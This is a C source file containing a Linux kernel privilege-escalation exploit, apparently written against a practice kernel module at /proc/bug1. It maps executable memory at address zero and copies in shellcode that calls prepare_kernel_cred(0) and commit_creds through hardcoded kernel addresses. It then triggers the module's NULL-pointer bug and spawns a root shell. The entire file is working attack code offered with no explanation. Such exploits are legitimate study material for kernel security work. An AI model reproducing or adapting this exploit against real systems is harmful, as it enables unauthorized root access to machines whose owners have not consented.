#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef int __attribute__((regparm(3))) (*_msleep)(unsigned long second);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

char buf[0x30000];

_msleep msleep;
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long native_write_cr4;
unsigned long poprdi;
unsigned long user_cs, user_ss, user_rflags;

int main(int argc, const char *argv[])
{
    /*
     *  mov rbx, 0xffffffff810a1420 // commit_creds
		mov rax, 0xffffffff810a1810 // kernel_prepare_cred
		xor rdi, rdi
		call rax
        mov rdi, rax
        call rbx
     */
    char payload[] = "\x48\xc7\xc3\x20\x14\x0a\x81\x48\xc7\xc0\x10\x18\x0a\x81\x48\x31\xff\xff\xd0\x48\x89\xc7\xff\xd3\xc3";
    mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
    memcpy(0, payload, sizeof(payload));
    commit_creds = 0xffffffff810a1420;
    prepare_kernel_cred = 0xffffffff810a1810;
    int fd = open("/proc/bug1", O_WRONLY);

    write(fd, "muhe", 4);
    //commit_creds(prepare_kernel_cred(0)); <-- this will fail, we can only call this in kernel space
    system("/bin/sh");
    return 0;
}
